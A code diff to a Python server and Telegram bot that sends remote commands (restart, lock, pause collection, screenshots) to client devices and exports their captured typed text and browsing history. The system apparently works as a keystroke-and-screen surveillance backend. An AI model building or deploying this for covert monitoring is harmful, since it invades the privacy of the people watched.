@@ -1,14 +1,17 @@
 import asyncio
 import base64
+import csv
 import gzip
 import hashlib
 import hmac
 import html
+import io
 import json
 import os
 import time
 import urllib.parse
 import urllib.request
+import uuid
 from urllib.error import HTTPError
 from contextlib import asynccontextmanager
 from collections import deque
@@ -31,6 +34,7 @@ devices: Dict[str, Dict[str, object]] = {}
 device_online_states: Dict[str, bool] = {}
 screenshot_requests: Dict[str, int] = {}
 screenshot_commands: Dict[str, str] = {}
+device_command_records: Dict[str, Dict[str, object]] = {}
 screenshot_statuses: Dict[str, Dict[str, object]] = {}
 website_history_statuses: Dict[str, Dict[str, str]] = {}
 DATABASE_URL = os.getenv("DATABASE_URL", "").strip()
@@ -289,10 +293,117 @@ def queue_device_command(device_id, command):
     normalized_command = str(command).strip().lower()
     if not normalized_device_id or normalized_device_id not in devices:
         return False, "Device not found. Use /devices to check the device ID."
-    if normalized_command not in {"shutdown", "logout"}:
+    if normalized_command not in {"shutdown", "logout", "restart", "lock", "pause", "resume"}:
         return False, "Unsupported client command."
-    screenshot_commands[normalized_device_id] = normalized_command
-    return True, normalized_device_id
+    command_id = uuid.uuid4().hex
+    now = int(time.time() * 1000)
+    record = {
+        "command_id": command_id,
+        "device_id": normalized_device_id,
+        "command": normalized_command,
+        "requested_by": "dashboard",
+        "source": "dashboard",
+        "status": "queued",
+        "created_at": now,
+        "claimed_at": None,
+        "completed_at": None,
+        "error": "",
+    }
+    device_command_records[command_id] = record
+    if DATABASE_URL:
+        try:
+            with psycopg.connect(DATABASE_URL) as connection:
+                with connection.cursor() as cursor:
+                    cursor.execute(
+                        """
+                        INSERT INTO device_commands
+                            (command_id, device_id, command, requested_by, source, status, created_at)
+                        VALUES (%s, %s, %s, %s, %s, %s, %s)
+                        """,
+                        (command_id, normalized_device_id, normalized_command, "dashboard", "dashboard", "queued", now),
+                    )
+        except Exception as error:
+            print(f"Could not persist device command: {error}")
+    else:
+        screenshot_commands[normalized_device_id] = normalized_command
+    audit_event("device_command_queued", device_id=normalized_device_id, details={"command_id": command_id, "command": normalized_command})
+    return True, command_id
+
+
+def audit_event(event_type, actor="system", source="server", device_id="", details=None):
+    if not DATABASE_URL:
+        return
+    try:
+        with psycopg.connect(DATABASE_URL) as connection:
+            with connection.cursor() as cursor:
+                cursor.execute(
+                    """
+                    INSERT INTO audit_events (event_type, actor, source, device_id, details, created_at)
+                    VALUES (%s, %s, %s, %s, %s::jsonb, %s)
+                    """,
+                    (event_type, actor, source, device_id, json.dumps(details or {}), int(time.time() * 1000)),
+                )
+    except Exception as error:
+        print(f"Could not save audit event: {error}")
+
+
+def claim_device_command(device_id):
+    normalized_device_id = str(device_id).strip()
+    if DATABASE_URL:
+        try:
+            with psycopg.connect(DATABASE_URL) as connection:
+                with connection.cursor() as cursor:
+                    cursor.execute(
+                        """
+                        SELECT command_id, device_id, command, requested_by, source, status, created_at, claimed_at, completed_at, error
+                        FROM device_commands
+                        WHERE device_id = %s AND status = 'queued'
+                        ORDER BY created_at ASC
+                        LIMIT 1
+                        FOR UPDATE SKIP LOCKED
+                        """,
+                        (normalized_device_id,),
+                    )
+                    row = cursor.fetchone()
+                    if not row:
+                        return None
+                    claimed_at = int(time.time() * 1000)
+                    cursor.execute(
+                        "UPDATE device_commands SET status = 'claimed', claimed_at = %s WHERE command_id = %s",
+                        (claimed_at, row[0]),
+                    )
+            return {
+                "command_id": row[0], "device_id": row[1], "command": row[2],
+                "requested_by": row[3], "source": row[4], "status": "claimed",
+                "created_at": row[6], "claimed_at": claimed_at, "completed_at": row[8], "error": row[9],
+            }
+        except Exception as error:
+            print(f"Could not claim device command: {error}")
+    command = screenshot_commands.pop(normalized_device_id, None)
+    if not command:
+        return None
+    for record in device_command_records.values():
+        if record["device_id"] == normalized_device_id and record["command"] == command and record["status"] == "queued":
+            record["status"] = "claimed"
+            record["claimed_at"] = int(time.time() * 1000)
+            return record
+    return None
+
+
+def list_device_commands(device_id, limit=50):
+    if DATABASE_URL:
+        try:
+            with psycopg.connect(DATABASE_URL) as connection:
+                with connection.cursor() as cursor:
+                    cursor.execute(
+                        "SELECT command_id, device_id, command, requested_by, source, status, created_at, claimed_at, completed_at, error FROM device_commands WHERE device_id = %s ORDER BY created_at DESC LIMIT %s",
+                        (device_id, min(max(limit, 1), 100)),
+                    )
+                    rows = cursor.fetchall()
+            return [dict(zip(("command_id", "device_id", "command", "requested_by", "source", "status", "created_at", "claimed_at", "completed_at", "error"), row)) for row in rows]
+        except Exception as error:
+            print(f"Could not list device commands: {error}")
+    return [record for record in sorted(device_command_records.values(), key=lambda item: item["created_at"], reverse=True) if record["device_id"] == device_id][:limit]
 
 
 def telegram_controls_markup():
@@ -305,6 +416,10 @@ def telegram_controls_markup():
         rows.append([
             {"text": f"Shut down {name}", "callback_data": f"control:shutdown:{device_id}"},
             {"text": f"Log out {name}", "callback_data": f"control:logout:{device_id}"},
+        ])
+        rows.append([
+            {"text": f"Restart {name}", "callback_data": f"control:restart:{device_id}"},
+            {"text": f"Pause {name}", "callback_data": f"control:pause:{device_id}"},
         ])
     return {"inline_keyboard": rows}
 
@@ -323,6 +438,31 @@ def telegram_controls_text():
         name = html.escape(str(device.get("name", "Unknown device")))
         lines.append(f"• <b>{name}</b> — <code>{device_id}</code>")
     return telegram_panel("CONTROLS // CLIENTS", "\n".join(lines))
+
+
+def telegram_device_text(device_id):
+    normalized_device_id = str(device_id).strip()
+    device = devices.get(normalized_device_id)
+    if not device:
+        return telegram_panel("DEVICE // NOT FOUND", "Use /devices to check the device ID.")
+    now = int(time.time() * 1000)
+    last_seen = int(device.get("last_seen", 0))
+    online = device_online_states.get(normalized_device_id, now - last_seen <= DEVICE_OFFLINE_AFTER * 1000)
+    commands = list_device_commands(normalized_device_id, 5)
+    command_lines = "\n".join(
+        f"• {html.escape(str(item['command']))}: <b>{html.escape(str(item['status']))}</b>"
+        for item in commands
+    ) or "No commands yet."
+    return telegram_panel(
+        "DEVICE // DETAIL",
+        f"<b>NAME:</b> {html.escape(str(device.get('name', 'Unknown device')))}\n"
+        f"<b>ID:</b> <code>{html.escape(normalized_device_id)}</code>\n"
+        f"<b>STATUS:</b> {'🟢 Online' if online else '🔴 Offline'}\n"
+        f"<b>LAST HEARTBEAT:</b> {format_uptime(max(0, (now - last_seen) // 1000))} ago\n"
+        f"<b>USER:</b> {html.escape(str(device.get('logged_in_user', 'Unknown user')))}\n"
+        f"<b>BATTERY:</b> {html.escape(str(device.get('battery_status', 'Unknown')))} {device.get('battery_percent') or ''}%\n\n"
+        f"<b>RECENT COMMANDS</b>\n{command_lines}",
+    )
 
 
 def telegram_messages_text():
@@ -351,9 +491,15 @@ def telegram_help_text():
         "🏠 /start — welcome screen\n"
         "📊 /status — health and uptime\n"
         "📱 /devices — device status\n"
+        "🔎 /device DEVICE_ID — device detail\n"
         "🎛️ /controls — show device controls\n"
         "⏻ /shutdown DEVICE_ID — shut down a client\n"
         "🔒 /logout DEVICE_ID — log out a client\n"
+        "🔁 /restart DEVICE_ID — restart a client\n"
+        "🔐 /lock DEVICE_ID — lock a client\n"
+        "⏸️ /pause DEVICE_ID — pause collection\n"
+        "▶️ /resume DEVICE_ID — resume collection\n"
+        "📸 /screenshot DEVICE_ID — request a screenshot\n"
         "📨 /messages — stored message totals\n"
         "🔗 /setsite URL — update the client service URL\n"
         "💛 /support — support options\n"
@@ -416,9 +562,15 @@ def configure_telegram_menu():
                         {"command": "help", "description": "Show available commands"},
                         {"command": "status", "description": "Show service health and uptime"},
                         {"command": "devices", "description": "List connected devices"},
+                        {"command": "device", "description": "Show one device detail"},
                         {"command": "controls", "description": "Show basic device controls"},
                         {"command": "shutdown", "description": "Shut down a client by device ID"},
                         {"command": "logout", "description": "Log out a client by device ID"},
+                        {"command": "restart", "description": "Restart a client by device ID"},
+                        {"command": "lock", "description": "Lock a client by device ID"},
+                        {"command": "pause", "description": "Pause collection by device ID"},
+                        {"command": "resume", "description": "Resume collection by device ID"},
+                        {"command": "screenshot", "description": "Request a client screenshot"},
                         {"command": "messages", "description": "Show stored message totals"},
                         {"command": "setsite", "description": "Change the desktop client service URL"},
                         {"command": "support", "description": "Show support options"},
@@ -514,6 +666,8 @@ def poll_telegram_commands():
                     reply = telegram_uptime_text()
                 elif command_lower == "/devices":
                     reply = telegram_devices_text()
+                elif command_lower == "/device":
+                    reply = telegram_device_text(text[len(command):].strip())
                 elif command_lower == "/controls":
                     reply = telegram_controls_text()
                 elif command_lower in {"/shutdown", "/logout"}:
@@ -525,6 +679,22 @@ def poll_telegram_commands():
                         f"Command queued for <code>{html.escape(result)}</code>."
                         if succeeded else html.escape(result),
                     )
+                elif command_lower in {"/restart", "/lock", "/pause", "/resume"}:
+                    requested_device_id = text[len(command):].strip()
+                    action = command_lower[1:]
+                    succeeded, result = queue_device_command(requested_device_id, action)
+                    reply = telegram_panel(
+                        f"CLIENT // {action.upper()}",
+                        f"Command queued: <code>{html.escape(result)}</code>"
+                        if succeeded else html.escape(result),
+                    )
+                elif command_lower == "/screenshot":
+                    requested_device_id = text[len(command):].strip()
+                    if requested_device_id not in devices:
+                        reply = telegram_panel("SCREENSHOT // FAILED", "Device not found. Use /devices to check the device ID.")
+                    else:
+                        screenshot_requests[requested_device_id] = int(time.time() * 1000)
+                        reply = telegram_panel("SCREENSHOT // QUEUED", f"Screenshot requested for <code>{html.escape(requested_device_id)}</code>.")
                 elif command_lower == "/messages":
                     reply = telegram_messages_text()
                 elif command_lower == "/setsite":
@@ -957,6 +1127,8 @@ async def enforce_login_for_dashboard(request: Request, call_next):
         "/api/website-history",
         "/api/screenshots",
         "/api/raw-history",
+        "/api/activity",
+        "/api/export/messages",
         "/login",
         "/logout",
     }
@@ -966,7 +1138,7 @@ async def enforce_login_for_dashboard(request: Request, call_next):
     if path.startswith("/health"):
         return await call_next(request)
     if path.startswith("/api/devices/") and not path.startswith("/api/devices/website-history-status"):
-        if path in {"/api/devices/heartbeat", "/api/devices/screenshot-upload", "/api/devices/screenshot-status", "/api/devices/offline"}:
+        if path in {"/api/devices/heartbeat", "/api/devices/screenshot-upload", "/api/devices/screenshot-status", "/api/devices/offline"} or "/commands/" in path and path.endswith("/ack"):
             return await call_next(request)
         if path.startswith("/api/devices/") and "/screenshot" in path:
             return await call_next(request)
@@ -1195,6 +1367,70 @@ async def fetch_devices():
     return JSONResponse(result)
 
 
+@app.get("/api/devices/{device_id}/detail")
+async def fetch_device_detail(device_id: str):
+    normalized_device_id = device_id.strip()
+    device = devices.get(normalized_device_id)
+    if not device:
+        return JSONResponse({"ok": False, "error": "device not found"}, status_code=404)
+    recent_messages = [item for item in messages if str(item.get("device_id")) == normalized_device_id][-50:]
+    recent_sites = [item for item in reversed(website_history) if item.get("device_id") == normalized_device_id][:50]
+    now = int(time.time() * 1000)
+    last_seen = int(device.get("last_seen", 0))
+    device_summary = {
+        **device,
+        "online": device_online_states.get(normalized_device_id, now - last_seen <= DEVICE_OFFLINE_AFTER * 1000),
+        "last_seen_age_seconds": max(0, (now - last_seen) // 1000),
+        "commands": list_device_commands(normalized_device_id),
+    }
+    return JSONResponse({
+        "device": device_summary,
+        "messages": recent_messages,
+        "website_history": recent_sites,
+        "commands": device_summary["commands"],
+    })
+
+
+@app.get("/api/activity")
+async def fetch_activity(device_id: str | None = None):
+    selected = (device_id or "").strip()
+    selected_messages = [item for item in messages if not selected or str(item.get("device_id")) == selected]
+    selected_sites = [item for item in website_history if not selected or item.get("device_id") == selected]
+    apps = {}
+    domains = {}
+    for item in selected_messages:
+        app_name = str(item.get("app_name") or "Unknown app")
+        apps[app_name] = apps.get(app_name, 0) + 1
+    for item in selected_sites:
+        domain = urllib.parse.urlparse(str(item.get("url", ""))).netloc
+        if domain:
+            domains[domain] = domains.get(domain, 0) + 1
+    return JSONResponse({
+        "messages": len(selected_messages),
+        "website_visits": len(selected_sites),
+        "raw_events": 0,
+        "top_apps": sorted(apps.items(), key=lambda item: item[1], reverse=True)[:10],
+        "top_domains": sorted(domains.items(), key=lambda item: item[1], reverse=True)[:10],
+        "recent_messages": selected_messages[-20:],
+        "recent_websites": list(reversed(selected_sites[-20:])),
+    })
+
+
+@app.get("/api/export/messages")
+async def export_messages(device_id: str | None = None, format: str = "csv"):
+    selected = (device_id or "").strip()
+    items = [item for item in messages if not selected or str(item.get("device_id")) == selected]
+    audit_event("messages_exported", device_id=selected, details={"format": format, "count": len(items)})
+    if format.lower() == "json":
+        return JSONResponse(items)
+    output = io.StringIO()
+    writer = csv.DictWriter(output, fieldnames=["id", "time", "device_id", "device_name", "app_name", "text", "source_url"])
+    writer.writeheader()
+    for item in items:
+        writer.writerow({field: item.get(field, "") for field in writer.fieldnames})
+    return Response(output.getvalue(), media_type="text/csv", headers={"Content-Disposition": "attachment; filename=keyboardservice-messages.csv"})
+
+
 @app.get("/api/screenshots")
 async def fetch_screenshots(device_id: str | None = None):
     if not DATABASE_URL:
@@ -1324,10 +1560,12 @@ async def device_heartbeat(
             "message": "The client is capturing the desktop.",
             "updated_at": now,
         }
+    command = claim_device_command(device_id)
     response = {
         "ok": True,
         "screenshot_requested": screenshot_requested,
-        "command": screenshot_commands.pop(device_id, None),
+        "command": command.get("command") if command else None,
+        "command_id": command.get("command_id") if command else None,
     }
     if valid_site_url(CLIENT_SITE_URL):
         response["client_site_url"] = CLIENT_SITE_URL
@@ -1366,6 +1604,44 @@ async def request_device_command(
     if not succeeded:
         status_code = 400 if "Unsupported" in result else 404
         return JSONResponse({"ok": False, "error": result.lower()}, status_code=status_code)
+    return JSONResponse({"ok": True, "command_id": result})
+
+
+@app.get("/api/devices/{device_id}/commands")
+async def fetch_device_commands(device_id: str, limit: int = 50):
+    normalized_device_id = device_id.strip()
+    if normalized_device_id not in devices:
+        return JSONResponse({"ok": False, "error": "device not found"}, status_code=404)
+    return JSONResponse(list_device_commands(normalized_device_id, limit))
+
+
+@app.post("/api/devices/{device_id}/commands/{command_id}/ack")
+async def acknowledge_device_command(device_id: str, command_id: str, request: Request):
+    payload = await request.json()
+    status = str(payload.get("status", "failed")).strip().lower()
+    error = str(payload.get("error", "")).strip()
+    if status not in {"completed", "failed"}:
+        return JSONResponse({"ok": False, "error": "unsupported status"}, status_code=400)
+    completed_at = int(time.time() * 1000)
+    updated = False
+    if DATABASE_URL:
+        try:
+            with psycopg.connect(DATABASE_URL) as connection:
+                with connection.cursor() as cursor:
+                    cursor.execute(
+                        "UPDATE device_commands SET status = %s, completed_at = %s, error = %s WHERE command_id = %s AND device_id = %s",
+                        (status, completed_at, error, command_id, device_id.strip()),
+                    )
+                    updated = cursor.rowcount > 0
+        except Exception as db_error:
+            print(f"Could not acknowledge device command: {db_error}")
+    record = device_command_records.get(command_id)
+    if record and record["device_id"] == device_id.strip():
+        record.update({"status": status, "completed_at": completed_at, "error": error})
+        updated = True
+    if not updated:
+        return JSONResponse({"ok": False, "error": "command not found"}, status_code=404)
+    audit_event("device_command_acknowledged", device_id=device_id, details={"command_id": command_id, "status": status, "error": error})
     return JSONResponse({"ok": True})
 
 
@@ -1387,10 +1663,12 @@ async def poll_device_screenshot_request(
             "message": "The client is capturing the desktop.",
             "updated_at": now,
         }
+    command = claim_device_command(normalized_device_id)
     return JSONResponse({
         "ok": True,
         "screenshot_requested": screenshot_requested,
-        "command": screenshot_commands.pop(normalized_device_id, None),
+        "command": command.get("command") if command else None,
+        "command_id": command.get("command_id") if command else None,
     })
 
 
